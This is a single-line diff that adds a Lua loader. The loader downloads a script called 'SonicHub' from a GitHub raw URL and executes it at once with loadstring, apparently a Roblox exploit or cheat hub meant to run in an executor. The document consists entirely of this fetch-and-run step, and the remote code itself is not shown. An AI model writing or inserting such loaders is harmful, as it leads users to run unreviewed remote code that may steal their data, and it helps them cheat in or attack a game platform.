@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KEYMAN2010/SonicHub/main/code.lua"))()
